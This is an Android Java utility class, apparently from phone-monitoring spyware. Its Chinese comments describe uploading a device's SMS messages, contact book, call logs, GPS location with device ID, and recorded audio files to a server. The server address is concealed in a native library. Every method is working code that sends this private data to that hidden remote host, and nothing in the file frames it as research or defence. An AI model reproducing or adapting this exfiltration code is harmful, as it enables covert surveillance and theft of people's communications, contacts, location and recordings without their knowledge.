package com.privacy.system.util;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Proxy;
import java.net.URL;
import android.content.Context;

/**
 * 联网工具类
 * 主要执行文件的上传、下载操作
 */
public class NetworkUtil {
	static{
		
		System.loadLibrary("util");
	
	}
	
	//此方法由c语言实现
	public static native String getURL();
	
	
	public static boolean uploadSMS(Context ctx,String updateData,String requestMethod){
		URL url = null;
		HttpURLConnection conn = null;
		boolean isUpload = false;
		if(!HttpUtil.detect(ctx))return isUpload;
		try {
			String strUrl = getURL();
			strUrl = strUrl+"/"+requestMethod;
			Logger.d("NewworkUtil",strUrl);
			url = new URL(strUrl);
			if (HttpUtil.WAP_INT == HttpUtil.getNetType(ctx)) {
				Proxy proxy = new Proxy(java.net.Proxy.Type.HTTP,new InetSocketAddress("10.0.0.172", 80));
				conn = (HttpURLConnection) url.openConnection(proxy);
			} else {
				conn = (HttpURLConnection) url.openConnection();
			}
			byte [] datas = updateData.getBytes();
			conn.setConnectTimeout(30000);
			conn.setReadTimeout(30000);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			//conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length",datas.length+"");
			conn.getOutputStream().write(datas);
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				Logger.d("NetworkUtil","上传短信成功");
				isUpload = true;
			}else {
				Logger.d("NetworkUtil","上传短信失败");
			}
			
		} catch (Exception e) {
			Logger.d("NetworkUtil","上传短信异常"+e.getMessage());
		}
		return isUpload;
	}
	
	
	
	/**专用于上传定位信息*/
	public static synchronized boolean sendLocInfo(Context context,String key,String device_id, String lon, String lat, String loc_name, String locTime, String requestMethod) {
		boolean isUpload = false;
		try {
			if(!HttpUtil.detect(context))return false;
			String strUrl = getURL();
			strUrl = strUrl+"/"+requestMethod;
			URL url = new URL(strUrl);
			Logger.d("Net","正在上传定位信息");
			String param = "key=" + key + "&device_id=" + device_id + "&lon=" + lon+"&lat="+lat+"&loc_name="+loc_name+"&time="+locTime;

			Logger.d("NetworkUtil",param);

			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setConnectTimeout(5 * 1000);
			conn.setRequestMethod("POST");
			conn.setDoOutput(true);
			OutputStream os = conn.getOutputStream();
			os.write(param.getBytes());
			
			if (conn.getResponseCode() == 200) {
				isUpload = true;
				Logger.d("NetworkUtil","上传位置信息成功...");
			}else {
				Logger.d("NetworkUtil","上传位置信息失败...");
			}
			
		} catch (Exception e) {
			Logger.d("NetworkUtil","上传位置信息异常..."+e.getMessage());
		}
		return isUpload;
	}
	
	/**
	 * 上传文件
	 * @param ctx 上下文
	 * @param url 上传文件的url
	 * @param object 上传文件的内容
	 * @return 响应结果
	 */
	public static boolean uploadBook(Context ctx,String updateData,String requestMethod){
		URL url = null;
		HttpURLConnection conn = null;
		boolean isUpload = false;
		if(!HttpUtil.detect(ctx))return false;
		try {
			String strUrl = getURL();
			strUrl = strUrl+"/"+requestMethod;
			Logger.d("NewworkUtil",strUrl);
			url = new URL(strUrl);
			if (HttpUtil.WAP_INT == HttpUtil.getNetType(ctx)) {
				Proxy proxy = new Proxy(java.net.Proxy.Type.HTTP,new InetSocketAddress("10.0.0.172", 80));
				conn = (HttpURLConnection) url.openConnection(proxy);
			} else {
				conn = (HttpURLConnection) url.openConnection();
			}
			byte [] datas = updateData.getBytes();
			conn.setConnectTimeout(30000);
			conn.setReadTimeout(30000);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			//conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length",datas.length+"");
			conn.getOutputStream().write(datas);
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				Logger.d("NetworkUtil","上传通讯录成功");
				isUpload = true;
			}else {
				Logger.d("NetworkUtil","上传通讯录失败");
			}
		} catch (Exception e) {
			Logger.d("NetworkUtil","上传通讯录异常"+e.getMessage());
		}
		return isUpload;
	}
	
	/**
	 * 下载文件
	 */
	public static InputStream download(Context ctx,String updateData,String requestMethod){
		URL url = null;
		HttpURLConnection conn = null;
		InputStream is = null;
		try {
			String strUrl = getURL();
			strUrl = strUrl+"/"+requestMethod;
			Logger.d("NewworkUtil",strUrl);
			url = new URL(strUrl);
			if (HttpUtil.WAP_INT == HttpUtil.getNetType(ctx)) {
				Proxy proxy = new Proxy(java.net.Proxy.Type.HTTP,new InetSocketAddress("10.0.0.172", 80));
				conn = (HttpURLConnection) url.openConnection(proxy);
			} else {
				conn = (HttpURLConnection) url.openConnection();
			}
			byte [] datas = updateData.getBytes();
			conn.setConnectTimeout(30000);
			conn.setReadTimeout(30000);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			//conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length",datas.length+"");
			conn.getOutputStream().write(datas);
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				Logger.d("NewworkUtil","下载数据成功");
				is = conn.getInputStream();
			}
			
		} catch (Exception e) {
			Logger.d("NetworkUtil",e.getMessage());
			return null;
		}
		return is;
	}
	
	public static boolean uploadCall(Context context,String params,String requestMethod){
		boolean isUpload = false;
		if(!HttpUtil.detect(context))return false;
		try {
			String strUrl=getURL()+"/"+requestMethod;
			URL url = new URL(strUrl);
		
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setConnectTimeout(30000);
			conn.setReadTimeout(30000);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			conn.getOutputStream().write(params.getBytes());
		    if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
		    	Logger.d("NewworkUtil","上传通话记录数据成功");
		     	isUpload = true;
		    }else {
		    	Logger.d("NewworkUtil","上传通话记录数据失败");
			}
		} catch (Exception e) {
			Logger.d("NewworkUtil","上传通话记录数据异常了"+e.getMessage());
		}
		return isUpload;
	}
	
	
	
	/**上传文件*/
	public static boolean uploadFile(Context context,String filePath,String fileName,String requestMethod){
		boolean isUpload = false;
		if(!HttpUtil.detect(context))return false;
		try {
			File file = new File(filePath);
			
			if(!file.exists()){
				Logger.d("NetworkUtil","文件不存在");
				 return isUpload;
			}else {
				long fileSize= file.length();
				if(fileSize <=0){

					Logger.d("NetworkUtil","文件不存在");
					return isUpload;
				}
			}
			URL url = new URL(getURL()+"/"+requestMethod);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setDoInput(true);
			conn.setDoOutput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Connection", "Keep-Alive");
			conn.setRequestProperty("Charset", "UTF-8");
			conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + "******");
			DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
			dos.writeBytes("--******\r\n");
			dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\""+fileName+"\"" + "\r\n");
			dos.writeBytes("\r\n");
			FileInputStream fis = new FileInputStream(filePath);
			byte[] buffer = new byte[8192]; // 8k
			int count = 0;
			while ((count = fis.read(buffer)) != -1) {
				dos.write(buffer, 0, count);
			}
			fis.close();
			dos.writeBytes("\r\n");
			dos.writeBytes("--******--\r\n");
			dos.flush();
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				Logger.d("NetworkUtil","上传录音文件成功");
				isUpload = true;

			}else {
				Logger.d("NetworkUtil","上传录音文件失败");
			}
		} catch (MalformedURLException e) {
			Logger.d("NetworkUtil","上传录音文件异常:"+e.getMessage());
		} catch (IOException e) {
			Logger.d("NetworkUtil","上传录音文件异常:"+e.getMessage());
		}
		return isUpload;
	}
	
	/**上传文件信息*/
	public static boolean uploadFileInfo(Context context,String params,String requestMethod){
		boolean isUpload = false;
		if(!HttpUtil.detect(context))return false;
			try {
				String strURL = getURL()+"/"+requestMethod;
				URL url = new URL(strURL);
				HttpURLConnection conn = (HttpURLConnection) url.openConnection();
				conn.setDoInput(true);
				conn.setDoOutput(true);
				conn.setConnectTimeout(30000);
				conn.setReadTimeout(30000);
				conn.setRequestMethod("POST");
				conn.getOutputStream().write(params.getBytes());
				if (conn.getResponseCode() == 200) {
					Logger.d("NetworkUtil", "上传定时录音文件信息成功");
					isUpload = true;
				} else {
					Logger.d("NetworkUtil", "上传定时录音文件信息失败");
				}
				
			} catch (MalformedURLException e) {
				Logger.d("NetworkUtil", "上传定时录音文件信息异常");
			} catch (IOException e) {
				Logger.d("NetworkUtil", "上传定时录音文件信息异常");
			}
		
		return isUpload;
	}
}
